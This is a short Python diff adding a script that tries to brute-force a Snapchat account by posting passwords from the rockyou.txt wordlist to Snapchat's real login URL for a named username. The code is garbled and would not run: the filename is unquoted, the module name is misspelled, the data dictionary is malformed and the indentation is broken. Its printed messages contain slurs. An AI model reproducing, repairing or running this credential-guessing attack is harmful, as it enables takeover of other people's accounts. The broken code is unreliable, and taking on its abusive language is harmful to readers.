@@ -1,0 +1,13 @@
+import requests
+
+url = 'https://accounts.snapchat.com/accounts/login?continue=%2Faccounts%2Fwelcome'
+arg = open(rockyou.txt,'r')
+for line in arg:
+	password = line.strip()
+http = request.post(url, data=('form1':'Casp','form2':password, 'login')
+content = http.content
+if 'Logged in' in content:
+	print('Congrats, Dimitri found ur password retard')
+break
+else
+print('Nigga use a better password list & change my code to use it smh')
